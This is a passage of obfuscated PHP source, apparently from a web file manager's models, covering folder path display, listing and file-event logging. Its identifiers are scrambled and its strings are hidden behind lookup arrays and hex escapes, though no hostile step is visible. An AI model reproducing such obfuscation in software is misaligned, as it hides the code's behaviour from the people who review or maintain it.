$ï¡ıâ­à[12]; $²©ƒ³ã¼ = count($Ã±†’ò×) - $ôÊ£éİ; for ($¶ŠĞµÂ = 0; $¶ŠĞµÂ < $²©ƒ³ã¼; $¶ŠĞµÂ++) { if (!isset($¦áÊ³Áª[$Ã±†’ò×[$¶ŠĞµÂ]])) { $æÒ†Óà  = $ï¡ıâ­à[12]; break; } $æÒ†Óà  = $æÒ†Óà  . rtrim($¦áÊ³Áª[$Ã±†’ò×[$¶ŠĞµÂ]], $ï¡ıâ­à[8]) . $ï¡ıâ­à[8]; } $Áñ’åÔ¹[$ï¡ıâ­à[489]][$ï¡ıâ­à[583]] = rtrim($æÒ†Óà , $ï¡ıâ­à[8]) . $ï¡ıâ­à[8]; break; } } unset($Áñ’åÔ¹); } public function groupPathDisplay(&$ßÕØ—Åğ) { $¸¤Öû«ê =& $_SERVER[Š—Â“œÔ]; if ($ßÕØ—Åğ[$¸¤Öû«ê[190]] != self::TYPE_GROUP) { return; } $©êö£È‘ = Model($¸¤Öû«ê[587])->getInfo($ßÕØ—Åğ[$¸¤Öû«ê[571]]); $á—œ–© = $this->parentLevelArray($©êö£È‘[$¸¤Öû«ê[586]]); $Ìø³—¸ğ = $¸¤Öû«ê[12]; foreach ($á—œ–© as $şşïĞ§ş) { $Ì°®öÌƒ = Model($¸¤Öû«ê[587])->getInfo($şşïĞ§ş); $Ìø³—¸ğ .= $Ì°®öÌƒ[$¸¤Öû«ê[90]][$¸¤Öû«ê[193]] . $¸¤Öû«ê[50]; } $ßÕØ—Åğ[$¸¤Öû«ê[588]] = $©êö£È‘[$¸¤Öû«ê[192]]; $ßÕØ—Åğ[$¸¤Öû«ê[589]] = $©êö£È‘[$¸¤Öû«ê[586]]; $ßÕØ—Åğ[$¸¤Öû«ê[590]] = $©êö£È‘[$¸¤Öû«ê[591]]; $ßÕØ—Åğ[$¸¤Öû«ê[592]] = $Ìø³—¸ğ . $©êö£È‘[$¸¤Öû«ê[90]][$¸¤Öû«ê[193]]; } protected function _listAppendPath(&$ãöâ£˜, $å ú™ßÒ = false) { $­ğûì¿  =& $_SERVER[Š—Â“œÔ]; static $å¡¬İì = array(); $‡ºŒ‘Ì = array(); $ÅËºÃ®¾ = array(); if ($å ú™ßÒ) { return $å¡¬İì; } foreach ($ãöâ£˜ as &$î¾Â‡ıÕ) { $»¦—‹ëò = $î¾Â‡ıÕ[$­ğûì¿ [193]]; if ($î¾Â‡ıÕ[$­ğûì¿ [487]] == $­ğûì¿ [91] && $î¾Â‡ıÕ[$­ğûì¿ [192]] != 0) { $å¡¬İì[$»¦—‹ëò] = $î¾Â‡ıÕ[$­ğûì¿ [32]]; } if ($î¾Â‡ıÕ[$­ğûì¿ [487]] == $­ğûì¿ [91] && $î¾Â‡ıÕ[$­ğûì¿ [192]] == 0) { $å¡¬İì[$»¦—‹ëò] = $this->_listAppendPathRoot($î¾Â‡ıÕ, array()); } if (isset($ÅËºÃ®¾[$î¾Â‡ıÕ[$­ğûì¿ [586]]])) { continue; } $ÅËºÃ®¾[$î¾Â‡ıÕ[$­ğûì¿ [586]]] = !0; $æå±õœæ = $this->parentLevelArray($î¾Â‡ıÕ[$­ğûì¿ [586]]); foreach ($æå±õœæ as $Òµ‹™ò => $…ÛÅù«Ï) { if (isset($å¡¬İì[$…ÛÅù«Ï])) { continue; } if ($Òµ‹™ò == 0) { $å¡¬İì[$…ÛÅù«Ï] = $this->_listAppendPathRoot($î¾Â‡ıÕ, $æå±õœæ); } if ($Òµ‹™ò != 0) { $‡ºŒ‘Ì[] = $…ÛÅù«Ï; } } } unset($î¾Â‡ıÕ); $‡ºŒ‘Ì = array_unique($‡ºŒ‘Ì); if (count($‡ºŒ‘Ì) > 0) { $ƒ£œêå× = array($­ğûì¿ [493] => array($­ğûì¿ [494], $‡ºŒ‘Ì)); if (count($‡ºŒ‘Ì) == 1) { $©ŠıÖºè = $this->sourceInfo($‡ºŒ‘Ì[0]); $ÅÕ¥›ı™ = is_array($©ŠıÖºè) ? array($©ŠıÖºè) : !1; } else { $ÅÕ¥›ı™ = $this->field($­ğûì¿ [593])->where($ƒ£œêå×)->select(); } if (!$ÅÕ¥›ı™) { $ÅÕ¥›ı™ = array(); } foreach ($ÅÕ¥›ı™ as $’¡—¶©ä) { $å¡¬İì[$’¡—¶©ä[$­ğûì¿ [193]]] = $’¡—¶©ä[$­ğûì¿ [32]]; } } $•À˜€Á® = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $œ¶ÅÉÃ„ = array(); foreach ($ãöâ£˜ as &$î¾Â‡ıÕ) { $¢Ì†Å“• = $î¾Â‡ıÕ[$­ğûì¿ [586]]; $†’²èï = $­ğûì¿ [12]; if (isset($œ¶ÅÉÃ„[$¢Ì†Å“•])) { $†’²èï = $œ¶ÅÉÃ„[$¢Ì†Å“•]; } else { $æå±õœæ = $this->parentLevelArray($î¾Â‡ıÕ[$­ğûì¿ [586]]); foreach ($æå±õœæ as $Òµ‹™ò => $…ÛÅù«Ï) { if (isset($å¡¬İì[$…ÛÅù«Ï])) { $†’²èï .= $å¡¬İì[$…ÛÅù«Ï] . $­ğûì¿ [8]; } } $œ¶ÅÉÃ„[$¢Ì†Å“•] = $†’²èï; } $†’²èï .= $î¾Â‡ıÕ[$­ğûì¿ [32]]; if ($î¾Â‡ıÕ[$­ğûì¿ [487]] == $­ğûì¿ [91]) { $†’²èï .= $­ğûì¿ [8]; } $î¾Â‡ıÕ[$­ğûì¿ [584]] = str_replace($­ğûì¿ [256], $­ğûì¿ [8], $†’²èï); if ($î¾Â‡ıÕ[$­ğûì¿ [192]] == $­ğûì¿ [230]) { $î¾Â‡ıÕ[$­ğûì¿ [32]] = trim($å¡¬İì[$î¾Â‡ıÕ[$­ğûì¿ [193]]], $­ğûì¿ [8]); $î¾Â‡ıÕ[$­ğûì¿ [584]] = $î¾Â‡ıÕ[$­ğûì¿ [32]] . $­ğûì¿ [8]; } if (intval($î¾Â‡ıÕ[$­ğûì¿ [190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($î¾Â‡ıÕ, $æå±õœæ, $•À˜€Á®); } } unset($î¾Â‡ıÕ); return $ãöâ£˜; } private function _listAppendPathRecycle(&$®Ú¹¹÷•, $çÛéğÄ , $ú¢•– Û) { $ãÏªğÎ· =& $_SERVER[Š—Â“œÔ]; if (!in_array($ú¢•– Û, $çÛéğÄ ) && $®Ú¹¹÷•[$ãÏªğÎ·[193]] != $ú¢•– Û) { return; } $¦àù»í = explode($ãÏªğÎ·[8], trim($®Ú¹¹÷•[$ãÏªğÎ·[584]], $ãÏªğÎ·[8])); $ßãæÜÀş = implode($ãÏªğÎ·[8], array_slice($¦àù»í, 2)); $®Ú¹¹÷•[$ãÏªğÎ·[584]] = $ãÏªğÎ·[8] . LNG($ãÏªğÎ·[594]) . $ãÏªğÎ·[8] . ltrim($ßãæÜÀş, $ãÏªğÎ·[8]); $®Ú¹¹÷•[$ãÏªğÎ·[586]] = $ãÏªğÎ·[595] . implode($ãÏªğÎ·[50], array_slice($çÛéğÄ , 1)) . $ãÏªğÎ·[50]; if ($®Ú¹¹÷•[$ãÏªğÎ·[193]] == $ú¢•– Û) { $®Ú¹¹÷•[$ãÏªğÎ·[586]] = $ãÏªğÎ·[595]; $®Ú¹¹÷•[$ãÏªğÎ·[192]] = $ãÏªğÎ·[230]; $®Ú¹¹÷•[$ãÏªğÎ·[32]] = LNG($ãÏªğÎ·[594]); } $®Ú¹¹÷•[$ãÏªğÎ·[596]] = $ãÏªğÎ·[597]; } protected function _listAppendPathRoot(&$·‚ ªË, $•ŞíÍ®) { $¢Âû–Ã¹ =& $_SERVER[Š—Â“œÔ]; static $ì™¨Îòı = false; static $åß¦­ß = false; $œ¢‡‹Œ¥ = $¢Âû–Ã¹[12]; if ($·‚ ªË[$¢Âû–Ã¹[190]] == self::TYPE_USER) { if ($·‚ ªË[$¢Âû–Ã¹[571]] == USER_ID) { $œ¢‡‹Œ¥ = LNG($¢Âû–Ã¹[598]); if ($ì™¨Îòı === !1) { $èùº£É = Model($¢Âû–Ã¹[599])->getInfoFull(USER_ID); $ì™¨Îòı = _get($èùº£É, $¢Âû–Ã¹[600], $¢Âû–Ã¹[12]); } if ($åß¦­ß === !1) { $èùº£É = Model($¢Âû–Ã¹[599])->getInfoFull(USER_ID); $åß¦­ß = _get($èùº£É, $¢Âû–Ã¹[601], $¢Âû–Ã¹[12]); } if ($•ŞíÍ® && $•ŞíÍ®[0] == $ì™¨Îòı || !$•ŞíÍ® && $·‚ ªË[$¢Âû–Ã¹[193]] == $ì™¨Îòı) { $œ¢‡‹Œ¥ = LNG($¢Âû–Ã¹[602]); $·‚ ªË[$¢Âû–Ã¹[603]] = $¢Âû–Ã¹[604]; } if ($•ŞíÍ® && $•ŞíÍ®[0] == $åß¦­ß || !$•ŞíÍ® && $·‚ ªË[$¢Âû–Ã¹[193]] == $åß¦­ß) { $œ¢‡‹Œ¥ = $œ¢‡‹Œ¥ . $¢Âû–Ã¹[605] . LNG($¢Âû–Ã¹[606]); } if (!$•ŞíÍ®) { $·‚ ªË[$¢Âû–Ã¹[32]] = $œ¢‡‹Œ¥; } } else { $èùº£É = Model($¢Âû–Ã¹[599])->getInfoFull($·‚ ªË[$¢Âû–Ã¹[571]]); $À¹¨¥œƒ = _get($èùº£É, $¢Âû–Ã¹[601], $¢Âû–Ã¹[12]); $·‚ ªË[$¢Âû–Ã¹[607]] = Model($¢Âû–Ã¹[579])->getInfoSimpleOuter($·‚ ªË[$¢Âû–Ã¹[571]]); $œ¢‡‹Œ¥ = LNG($¢Âû–Ã¹[608]) . $¢Âû–Ã¹[176] . $·‚ ªË[$¢Âû–Ã¹[607]][$¢Âû–Ã¹[32]] . $¢Âû–Ã¹[178]; if ($•ŞíÍ® && $•ŞíÍ®[0] == $À¹¨¥œƒ || !$•ŞíÍ® && $·‚ ªË[$¢Âû–Ã¹[193]] == $À¹¨¥œƒ) { $œ¢‡‹Œ¥ = LNG($¢Âû–Ã¹[608]) . $¢Âû–Ã¹[609] . $·‚ ªË[$¢Âû–Ã¹[607]][$¢Âû–Ã¹[32]] . $¢Âû–Ã¹[605] . LNG($¢Âû–Ã¹[606]) . $¢Âû–Ã¹[178]; } } } else { if ($·‚ ªË[$¢Âû–Ã¹[190]] == self::TYPE_GROUP) { $¨­‰­Øí = Model($¢Âû–Ã¹[587])->getInfoSimple($·‚ ªË[$¢Âû–Ã¹[571]]); $œ¢‡‹Œ¥ = $¨­‰­Øí[$¢Âû–Ã¹[32]]; } else { if ($·‚ ªË[$¢Âû–Ã¹[190]] == self::TYPE_SYSTEM) { $œ¢‡‹Œ¥ = $¢Âû–Ã¹[610]; } } } $œ¢‡‹Œ¥ = $œ¢‡‹Œ¥ ? $¢Âû–Ã¹[8] . $œ¢‡‹Œ¥ . $¢Âû–Ã¹[8] : $¢Âû–Ã¹[8]; return $œ¢‡‹Œ¥; } protected function _listAppendUser(&$Œ˜æ®ÒÈ) { $ñ­öì·Ó =& $_SERVER[Š—Â“œÔ]; $ŒÊå”ÆĞ = array_to_keyvalue($Œ˜æ®ÒÈ, $ñ­öì·Ó[12], $ñ­öì·Ó[529]); $ŸúßøÜ¼ = array_to_keyvalue($Œ˜æ®ÒÈ, $ñ­öì·Ó[12], $ñ­öì·Ó[531]); $ŒúËŠöĞ = array_merge($ŒÊå”ÆĞ, $ŸúßøÜ¼); $Ú’ÏÀúÜ = Model($ñ­öì·Ó[599])->userListInfo($ŒúËŠöĞ); foreach ($Œ˜æ®ÒÈ as &$‹¢–öñ) { $èŒ„²²ğ = $‹¢–öñ[$ñ­öì·Ó[529]]; $‹¢–öñ[$ñ­öì·Ó[529]] = $Ú’ÏÀúÜ[$èŒ„²²ğ] ? $Ú’ÏÀúÜ[$èŒ„²²ğ] : !1; $èŒ„²²ğ = $‹¢–öñ[$ñ­öì·Ó[531]]; $‹¢–öñ[$ñ­öì·Ó[531]] = $Ú’ÏÀúÜ[$èŒ„²²ğ] ? $Ú’ÏÀúÜ[$èŒ„²²ğ] : !1; if (_get($‹¢–öñ, $ñ­öì·Ó[611], 0)) { $½ÂÓÔ¡É = $GLOBALS[$ñ­öì·Ó[6]][$ñ­öì·Ó[92]][$ñ­öì·Ó[612]]; if ($‹¢–öñ[$ñ­öì·Ó[541]][$ñ­öì·Ó[613]] <= time() - $½ÂÓÔ¡É) { $this->metaSet($‹¢–öñ[$ñ­öì·Ó[193]], $ñ­öì·Ó[614], null); $this->metaSet($‹¢–öñ[$ñ­öì·Ó[193]], $ñ­öì·Ó[613], null); unset($‹¢–öñ[$ñ­öì·Ó[541]][$ñ­öì·Ó[614]]); continue; } $ğÛ‡ÅøŸ = $‹¢–öñ[$ñ­öì·Ó[541]][$ñ­öì·Ó[614]]; $‹¢–öñ[$ñ­öì·Ó[541]][$ñ­öì·Ó[615]] = Model($ñ­öì·Ó[599])->getInfoSimpleOuter($ğÛ‡ÅøŸ); } } unset($‹¢–öñ); } public function parentLevelArray($ù°²¨é¥) { $ãÌ°¢šâ =& $_SERVER[Š—Â“œÔ]; $ù°²¨é¥ = explode($ãÌ°¢šâ[50], trim($ù°²¨é¥, $ãÌ°¢šâ[50])); return array_remove_value($ù°²¨é¥, $ãÌ°¢šâ[230]); } public function listAll($›¢ÎûŠ) { $–ò±şˆ½ =& $_SERVER[Š—Â“œÔ]; $‰½²òºô = $this->sourceInfo($›¢ÎûŠ); $êº…ôüØ = array($–ò±şˆ½[616] => array($–ò±şˆ½[617], $‰½²òºô[$–ò±şˆ½[586]] . $›¢ÎûŠ . $–ò±şˆ½[618]), $–ò±şˆ½[619] => 0); $¿¦±”ªÜ = $–ò±şˆ½[620]; $å·‰€¡’ = "\114\105\106\x54\40\x4a\x4f\111\116\40{$this->tablePrefix}\x69\x6f\x5f\x66\151\154\145\40\146\151\x6c\145\x20\x6f\x6e\x20\x73\x6f\x75\x72\143\145\x2e\x66\151\154\145\x49\x44\x20\x3d\40\x66\151\x6c\145\56\x66\x69\154\x65\111\104"; $™¹ÈÔŞ† = $this->alias($–ò±şˆ½[521])->field($¿¦±”ªÜ)->where($êº…ôüØ)->join($å·‰€¡’)->select(); $this->_listAppendAuth($™¹ÈÔŞ†); $this->_listAppendUser($™¹ÈÔŞ†); $this->_listAppendPath($™¹ÈÔŞ†); $™¹ÈÔŞ† = array_to_keyvalue($™¹ÈÔŞ†, $–ò±şˆ½[193]); $†ß»¼Ëà = "\x2f{$‰½²òºô[$–ò±şˆ½[32]]}\57"; $†ß»¼Ëà = $†ß»¼Ëà == $–ò±şˆ½[256] ? $–ò±şˆ½[8] : $†ß»¼Ëà; $š‹Ş©¨ = array(); foreach ($™¹ÈÔŞ† as $™¤ÑÆÁ³ => $¾ãáóä) { $É¡ò = $this->parentLevelArray($¾ãáóä[$–ò±şˆ½[586]]); array_shift($É¡ò); $ŠŸœá½¢ = $†ß»¼Ëà; for ($¿Ì£¨ÊÊ = 0; $¿Ì£¨ÊÊ < count($É¡ò); $¿Ì£¨ÊÊ++) { $ŠŸœá½¢ .= $™¹ÈÔŞ†[$É¡ò[$¿Ì£¨ÊÊ]][$–ò±şˆ½[32]] . $–ò±şˆ½[8]; } $ŠŸœá½¢ .= $¾ãáóä[$–ò±şˆ½[32]]; if ($¾ãáóä[$–ò±şˆ½[487]]) { $ŠŸœá½¢ .= $–ò±şˆ½[8]; } $¬Ä­«°« = array($–ò±şˆ½[497] => str_replace($–ò±şˆ½[256], $–ò±şˆ½[8], str_replace($–ò±şˆ½[256], $–ò±şˆ½[8], str_replace($–ò±şˆ½[256], $–ò±şˆ½[8], $ŠŸœá½¢))), $–ò±şˆ½[621] => intval($¾ãáóä[$–ò±şˆ½[487]]), $–ò±şˆ½[622] => intval($¾ãáóä[$–ò±şˆ½[79]]), $–ò±şˆ½[88] => intval($¾ãáóä[$–ò±şˆ½[88]]), $–ò±şˆ½[90] => $this->pathInfoFilter($¾ãáóä)); if (!$¬Ä­«°«[$–ò±şˆ½[487]]) { $¬Ä­«°«[$–ò±şˆ½[543]] = $¾ãáóä[$–ò±şˆ½[543]]; } $š‹Ş©¨[] = $¬Ä­«°«; } $š‹Ş©¨ = array_sort_by($š‹Ş©¨, $–ò±şˆ½[87]); return $š‹Ş©¨; } } goto Fà¯ß‹Ñğñ; aÓÏŠÕ£…: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\x75\x72\143\x65\x5f\145\166\145\x6e\164"; protected $dataAuto = array(array("\143\x72\x65\141\164\x65\124\151\x6d\x65", "\x74\x69\155\145", "\151\x6e\x73\x65\162\x74", "\x66\x75\x6e\x63\x74\x69\x6f\x6e"), array("\x64\x65\163\x63", '', "\x69\156\x73\145\x72\x74\54\165\160\144\141\164\145\x2c\x73\145\154\x65\x63\x74", "\152\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($œÇè‚Ëå, $÷½ñº¡Ô, $•ñËïÃ = '') { $ŒÖÀ”š¡ =& $_SERVER[Š—Â“œÔ]; if (!$this->eventSave) { return; } $ĞÆª×÷À = Model($ŒÖÀ”š¡[1419])->sourceInfo($œÇè‚Ëå); if (!$ĞÆª×÷À) { return !1; } if ($this->isDisableEvent($ĞÆª×÷À, $÷½ñº¡Ô)) { return; } if ($•ñËïÃ && is_string($•ñËïÃ)) { $•ñËïÃ = array($ŒÖÀ”š¡[2010] => $•ñËïÃ); } $¾›ƒ—ô° = defined($ŒÖÀ”š¡[2198]) ? USER_ID : 0; $ä¹ –Ë¥ = array($ŒÖÀ”š¡[493] => $œÇè‚Ëå, $ŒÖÀ”š¡[2199] => $ĞÆª×÷À[$ŒÖÀ”š¡[192]], $ŒÖÀ”š¡[2200] => $ĞÆª×÷À[$ŒÖÀ”š¡[32]], $ŒÖÀ”š¡[584] => !empty($ĞÆª×÷À[$ŒÖÀ”š¡[584]]) ? $ĞÆª×÷À[$ŒÖÀ”š¡[584]] : $ŒÖÀ”š¡[12], $ŒÖÀ”š¡[1761] => $¾›ƒ—ô°, $ŒÖÀ”š¡[498] => $÷½ñº¡Ô, $ŒÖÀ”š¡[1763] => $•ñËïÃ); $this->addSystemLog($÷½ñº¡Ô, $ä¹ –Ë¥); unset($ä¹ –Ë¥[$ŒÖÀ”š¡[2200]], $ä¹ –Ë¥[$ŒÖÀ”š¡[584]]); return $this->add($ä¹ –Ë¥); } private function addSystemLog($¤ôı™µğ, $íúàÚãì) { $œÕ”’¦¢ =& $_SERVER[Š—Â“œÔ]; if ($¤ôı™µğ == $œÕ”’¦¢[2201]) { $¤ôı™µğ = $íúàÚãì[$œÕ”’¦¢[528]][$œÕ”’¦¢[2202]]; } else { if (in_array($¤ôı™µğ, array($œÕ”’¦¢[1950], $œÕ”’¦¢[2203]))) { $¤ôı™µğ = $íúàÚãì[$œÕ”’¦¢[528]][$œÕ”’¦¢[171]]; } } $ä¶Ä¸˜È = array_merge($íúàÚãì, array($œÕ”’¦¢[2204] => $íúàÚãì[$œÕ”’¦¢[193]], $œÕ”’¦¢[2205] => $íúàÚãì[$œÕ”’¦¢[2205]])); Hook::trigger($œÕ”’¦¢[2206], $œÕ”’¦¢[2207] . $¤ôı™µğ, $íúàÚãì); Model($œÕ”’¦¢[1914])->addLog($œÕ”’¦¢[2207] . $¤ôı™µğ, $ä¶Ä¸˜È); } private function isDisableEvent($ŸÚ„¢‰‘, $Óï¦ñÃí) { $Ñ‹Í‚Ñ =& $_SERVER[Š—Â“œÔ]; if ($ŸÚ„¢‰‘[$Ñ‹Í‚Ñ[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($Óï¦ñÃí == $Ñ‹Í‚Ñ[1939]) { return !1; } return !0; } public function eventCreate($è‘¶ı¦ç, $–‘²È¢É) { $ÃÄŸöËÈ =& $_SERVER[Š—Â“œÔ]; $é¨©Ášî = Model($ÃÄŸöËÈ[1419])->sourceInfo($è‘¶ı¦ç); $à³ø¹õ = array($ÃÄŸöËÈ[2202] => $–‘²È¢É, $ÃÄŸöËÈ[32] => $é¨©Ášî[$ÃÄŸöËÈ[32]]); return $this->addEvent($è‘¶ı¦ç, $ÃÄŸöËÈ[2201], $à³ø¹õ); } public function eventFileEdit($¨ü¹¿—) { $˜ÀöĞÎß =& $_SERVER[Š—Â“œÔ]; $èş¥ıË« = array($˜ÀöĞÎß[2208] => $_SERVER[$˜ÀöĞÎß[2209]], $˜ÀöĞÎß[2210] => strtolower(ACTION)); if (isset($GLOBALS[$˜ÀöĞÎß[7]][$˜ÀöĞÎß[2211]])) { $èş¥ıË«[$˜ÀöĞÎß[2211]] = $˜ÀöĞÎß[91]; } return $this->addEvent($¨ü¹¿—, $˜ÀöĞÎß[1940], $èş¥ıË«); } public function eventRecycle($„‡›²Æ¤, $í•ëƒ±İ) { return $this->addEvent($„‡›²Æ¤, $_SERVER[Š—Â“œÔ][2203], $í•ëƒ±İ); } private static $_removeLast = ''; public function eventRemove($˜ËÂ¬¯ª) { $—„‘æœ =& $_SERVER[Š—Â“œÔ]; self::$_removeLast = $˜ËÂ¬¯ª; $å´« ¾§ = Model($—„‘æœ[1419])->sourceInfo($˜ËÂ¬¯ª); $û•½õêÓ = array_field_key($å´« ¾§, array($—„‘æœ[193], $—„‘æœ[543], $—„‘æœ[507], $—„‘æœ[586])); $®Ö…Í˜õ = array($—„‘æœ[171] => $å´« ¾§[$—„‘æœ[32]], $—„‘æœ[2210] => ACTION, $—„‘æœ[2212] => $û•½õêÓ); return $this->addEvent($å´« ¾§[$—„‘æœ[192]], $—„‘æœ[1939], $®Ö…Í˜õ); } public function eventShare($œåÈŞÄË, $èŞğ·½ú) { return $this->addEvent($œåÈŞÄË, $_SERVER[Š—Â“œÔ][1950], $èŞğ·½ú); } public function eventMove($ù©£¿¨, $Ş«ÖÜ¤—, $ï‹¶õ”®) { $Ÿ‡‡ŒÂ =& $_SERVER[Š—Â“œÔ]; if (self::$_removeLast == $ù©£¿¨) { return; } $¾öÁõúÌ = Model($Ÿ‡‡ŒÂ[1419]); $‹öë¨ú™ = $¾öÁõúÌ->sourceInfo($ù©£¿¨); $«Ô×èÙª = $¾öÁõúÌ->sourceInfo($Ş«ÖÜ¤—); $œÆÑéòœ = $¾öÁõúÌ->sourceInfo($ï‹¶õ”®); $Öí€¸Å = array($Ÿ‡‡ŒÂ[1238] => $Ş«ÖÜ¤—, $Ÿ‡‡ŒÂ[2213] => $«Ô×èÙª[$Ÿ‡‡ŒÂ[32]], $Ÿ‡‡ŒÂ[2189] => !empty($«Ô×èÙª[$Ÿ‡‡ŒÂ[584]]) ? $«Ô×èÙª[$Ÿ‡‡ŒÂ[584]] : $Ÿ‡‡ŒÂ[12], $Ÿ‡‡ŒÂ[1239] => $ï‹¶õ”®, $Ÿ‡‡ŒÂ[2214] => $œÆÑéòœ[$Ÿ‡‡ŒÂ[32]], $Ÿ‡‡ŒÂ[2215] => !empty($œÆÑéòœ[$Ÿ‡‡ŒÂ[584]]) ? $œÆÑéòœ[$Ÿ‡‡ŒÂ[584]] : $Ÿ‡‡ŒÂ[12]); $this->addEvent($ù©£¿¨, $Ÿ‡‡ŒÂ[625], $Öí€¸Å); $‹öë¨ú™ = $¾öÁõúÌ->sourceInfo($ù©£¿¨); $Öí€¸Å = array($Ÿ‡‡ŒÂ[193] => $‹öë¨ú™[$Ÿ‡‡ŒÂ[193]], $Ÿ‡‡ŒÂ[32] => $‹öë¨ú™[$Ÿ‡‡ŒÂ[32]]); $this->addEvent($Ş«ÖÜ¤—, $Ÿ‡‡ŒÂ[2216], $Öí€¸Å); } public function eventCopy($å©­ óÊ) { $this->eventCreate($å©­ óÊ, $_SERVER[Š—Â“œÔ][623]); } public function eventRename($“–«–ÀÕ, $Ñ£õ¢´, $Å”´Ä”) { $¾ôÊ»Àş =& $_SERVER[Š—Â“œÔ]; $Ãûè¢™‡ = array($¾ôÊ»Àş[1238] => $Ñ£õ¢´, $¾ôÊ»Àş[1239] => $Å”´Ä”); return $this->addEvent($“–«–ÀÕ, $¾ôÊ»Àş[1433], $Ãûè¢™‡); } public function eventAddComment($“ğÕãÓ¥, $ÁÛ‡‚ãı) { return $this->addEvent($“ğÕãÓ¥, $_SERVER[Š—Â“œÔ][2217], $ÁÛ‡‚ãı); } public function eventAddDesc($™À‡³ºø, $ºòèğÑå) { return $this->addEvent($™À‡³ºø, $_SERVER[Š—Â“œÔ][2218], $ºòèğÑå); } public function listBySource($¤Ğë››Ä) { $…¢èŸş =& $_SERVER[Š—Â“œÔ]; $“¦Í¨² = Model($…¢èŸş[1419])->sourceInfo($¤Ğë››Ä); $ŸëÍôÅ = array($…¢èŸş[493] => $¤Ğë››Ä); if ($“¦Í¨²[$…¢èŸş[487]] == $…¢èŸş[91]) { $¦’É˜ = Model($…¢èŸş[1419])->listSearchChildren($¤Ğë››Ä, 20000); $¦’É˜[] = $¤Ğë››Ä . $…¢èŸş[456]; $ŸëÍôÅ = array($…¢èŸş[193] => array($…¢èŸş[7], $¦’É˜)); } $şšßèÙÏ = $this->where($ŸëÍôÅ)->order($…¢èŸş[2219])->selectPage(); if ($şšßèÙÏ[$…¢èŸş[444]][$…¢èŸş[445]] == 0) { $şšßèÙÏ[$…¢èŸş[444]][$…¢èŸş[445]] = 1; $şšßèÙÏ[$…¢èŸş[447]] = array(array($…¢èŸş[493] => $¤Ğë››Ä, $…¢èŸş[2199] => $“¦Í¨²[$…¢èŸş[192]], $…¢èŸş[1761] => $“¦Í¨²[$…¢èŸş[529]], $…¢èŸş[498] => $…¢èŸş[2220], $…¢èŸş[499] => $“¦Í¨²[$…¢èŸş[233]], $…¢èŸş[1763] => $…¢èŸş[12])); } return $this->eventListParse($şšßèÙÏ, $¤Ğë››Ä); } private function eventListParse($õËÓ±¡¯, $àƒ…±å) { $÷¯ÏæÈŸ =& $_SERVER[Š—Â“œÔ]; $ºÔñô‰ı = $õËÓ±¡¯[$÷¯ÏæÈŸ[447]]; $ç´óÁµ¨ = array_to_keyvalue($ºÔñô‰ı, $÷¯ÏæÈŸ[12], $÷¯ÏæÈŸ[193]); $ÁÁ®Ş¬£ = array_to_keyvalue($ºÔñô‰ı, $÷¯ÏæÈŸ[12], $÷¯ÏæÈŸ[2205]); foreach ($ºÔñô‰ı as $¹ä¹öÕô) { $ïúã³è‘ = $¹ä¹öÕô[$÷¯ÏæÈŸ[528]]; if ($¹ä¹öÕô[$÷¯ÏæÈŸ[33]] == $÷¯ÏæÈŸ[625] && isset($ïúã³è‘[$÷¯ÏæÈŸ[1238]])) { $ç´óÁµ¨[] = $ïúã³è‘[$÷¯ÏæÈŸ[1238]] . $÷¯ÏæÈŸ[12]; $ç´óÁµ¨[] = $ïúã³è‘[$÷¯ÏæÈŸ[1239]] . $÷¯ÏæÈŸ[12]; } if ($¹ä¹öÕô[$÷¯ÏæÈŸ[33]] == $÷¯ÏæÈŸ[2216] && isset($ïúã³è‘[$÷¯ÏæÈŸ[193]])) { $ç´óÁµ¨[] = $ïúã³è‘[$÷¯ÏæÈŸ[193]] . $÷¯ÏæÈŸ[12]; } } $ç´óÁµ¨ = array_merge($ç´óÁµ¨, $ÁÁ®Ş¬£, array($àƒ…±å . $÷¯ÏæÈŸ[12])); $ç´óÁµ¨ = array_unique($ç´óÁµ¨); $êÏŒ—şë = array_unique(array_to_keyvalue($ºÔñô‰ı, $÷¯ÏæÈŸ[12], $÷¯ÏæÈŸ[1770])); $¢±Ò‰ü¤ = Model($÷¯ÏæÈŸ[599])->userListInfo($êÏŒ—şë); $å´¢÷í¶ = Model($÷¯ÏæÈŸ[892])->sourceListInfo($ç´óÁµ¨, !0); foreach ($ºÔñô‰ı as &$¹ä¹öÕô) { if ($¹ä¹öÕô[$÷¯ÏæÈŸ[33]] == $÷¯ÏæÈŸ[625] && isset($¹ä¹öÕô[$÷¯ÏæÈŸ[528]][$÷¯ÏæÈŸ[1238]])) { $¹ä¹öÕô[$÷¯ÏæÈŸ[528]][$÷¯ÏæÈŸ[1238]] = $å´¢÷í¶[$¹ä¹öÕô[$÷¯ÏæÈŸ[528]][$÷¯ÏæÈŸ[1238]]]; $¹ä¹öÕô[$÷¯ÏæÈŸ[528]][$÷¯ÏæÈŸ[1239]] = $å´¢÷í¶[$¹ä¹öÕô[$÷¯ÏæÈŸ[528]][$÷¯ÏæÈŸ[1239]]]; } if ($¹ä¹öÕô[$÷¯ÏæÈŸ[33]] == $÷¯ÏæÈŸ[2216] && isset($¹ä¹öÕô[$÷¯ÏæÈŸ[528]][$÷¯ÏæÈŸ[193]])) { $¹ä¹öÕô[$÷¯ÏæÈŸ[528]][$÷¯ÏæÈŸ[193]] = $å´¢÷í¶[$¹ä¹öÕô[$÷¯ÏæÈŸ[528]][$÷¯ÏæÈŸ[193]]]; } $¹ä¹öÕô[$÷¯ÏæÈŸ[90]] = $å´¢÷í¶[$¹ä¹öÕô[$÷¯ÏæÈŸ[193]]]; $¹ä¹öÕô[$÷¯ÏæÈŸ[2221]] = $å´¢÷í¶[$¹ä¹öÕô[$÷¯ÏæÈŸ[2205]]]; if ($¹ä¹öÕô[$÷¯ÏæÈŸ[33]] == $÷¯ÏæÈŸ[1939]) { $¹ä¹öÕô[$÷¯ÏæÈŸ[2221]] = $¹ä¹öÕô[$÷¯ÏæÈŸ[90]]; $¹ä¹öÕô[$÷¯ÏæÈŸ[2205]] = $¹ä¹öÕô[$÷¯ÏæÈŸ[2221]][$÷¯ÏæÈŸ[193]]; $¹ä¹öÕô[$÷¯ÏæÈŸ[90]] = !1; $¹ä¹öÕô[$÷¯ÏæÈŸ[193]] = $÷¯ÏæÈŸ[12]; } 